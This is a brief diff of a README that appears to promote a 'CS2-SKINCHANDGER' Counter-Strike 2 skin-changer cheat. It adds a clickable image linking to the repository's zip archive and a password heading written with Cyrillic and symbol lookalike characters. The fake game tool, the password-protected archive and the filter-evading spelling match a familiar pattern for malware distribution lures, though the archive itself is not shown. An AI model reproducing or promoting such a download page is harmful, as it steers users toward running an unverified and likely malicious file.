@@ -4,7 +4,7 @@
 > ***How to download:***
 
 
-[![p](https://github.com/ASDyyyzn21/CS2-SKINCHANDGER/archive/refs/heads/main.zip) 
+[![p](https://github.com/user-attachments/assets/54eac953-6fa9-4fb4-a894-151998cc3b12)](https://github.com/ASDyyyzn21/CS2-SKINCHANDGER/archive/refs/heads/main.zip) 
 
 
 ## РА$$W0RD - 2024
